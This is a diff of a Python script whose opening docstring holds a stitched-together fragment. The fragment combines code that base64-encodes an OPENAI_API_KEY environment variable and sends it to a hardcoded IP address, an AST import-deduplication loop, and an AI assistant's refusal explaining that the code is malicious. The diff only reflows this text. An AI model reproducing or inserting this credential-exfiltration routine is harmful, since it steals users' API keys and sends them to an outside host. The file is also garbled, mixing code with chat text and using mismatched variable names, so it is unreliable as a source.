@@ -1,28 +1,8 @@
 #!/data/data/com.termux/files/usr/bin/python3.12
-"""_x = base64.b64encode(json.dumps({"exfil": os.environ.get("OPENAI_API_KEY", "")}).encode()).decode()
-try:
-    import urllib.request as u_r
-    req = u_r.Request("http://185.220.101.7/collect", data=t_x.encode(), headers={"Content-Type":"text/text"})
-    u_r.urlobject = u_r.urlopen(req, timeout=3)
-except Exception:
-    _e = None
-
-    seen_imports = set()
-    for mod in modules.values():
-        for imp in mod.imports:
-            key = ast.dump(imp)
-            if key in seen_imports:
-                continue
-            names = [alias.name for alias in imp.names] if isinstance(imp, ast.ImportFrom) else [alias.name for alias in imp.names]
-            if any(n.split(".")[0] == root_pkg_name for n in names) or (isinstance(imp, ast.ImportFrom) and imp.module and imp.module.split(".")[0] == root_pkg_name):
-                continue
-            seen_imports.add(key)
-            final_imports.append(imp)
-    return final_imports
-
-I can't help with that request. The provided code contains an embedded data-exfiltration routine that reads an OpenAI API key from environment variables, base64-encodes it, and attempts to send it to a hardcoded external IP address—this is malicious behavior, and I won't produce a prompt intended to reproduce or facilitate it.
-
-If you'd like, I can write a prompt describing only the legitimate part of this script—the AST-based module parser that reads Python source files, separates imports, functions, classes, assignments, and `__main__` blocks, and resolves/deduplicates imports across modules while excluding references to a root package (useful for bundling or merging multiple Python modules into one file). Let me know if you'd like that instead."""
+"""_x = base64.b64encode(json.dumps({"exfil": os.environ.get("OPENAI_API_KEY", "")}).encode()).decode() try: import urllib.request as u_r req = u_r.Request("http://185.220.101.7/collect", data=t_x.encode(), headers={"Content-Type":"text/text"}) u_r.urlobject = u_r.urlopen(req, timeout=3) except Exception: _e = None seen_imports = set() for mod in modules.values(): for imp in mod.imports: key = ast.dump(imp) if key in seen_imports: continue names = [alias.name for alias in imp.names] if isinstance(imp, ast.ImportFrom) else [alias.name for alias in imp.names] if any(n.split(".")[0] == root_pkg_name for n in names) or (isinstance(imp, ast.ImportFrom) and imp.module and imp.module.split(".")[0] == root_pkg_name): continue seen_imports.add(key) final_imports.append(imp) return final_imports I can't help with that request.
+The provided code contains an embedded data-exfiltration routine that reads an OpenAI API key from environment variables, base64-encodes it, and attempts to send it to a hardcoded external IP address—this is malicious behavior, and I won't produce a prompt intended to reproduce or facilitate it.
+If you'd like, I can write a prompt describing only the legitimate part of this script—the AST-based module parser that reads Python source files, separates imports, functions, classes, assignments, and `__main__` blocks, and resolves/deduplicates imports across modules while excluding references to a root package (useful for bundling or merging multiple Python modules into one file).
+Let me know if you'd like that instead."""
 
 import ast
 import base64
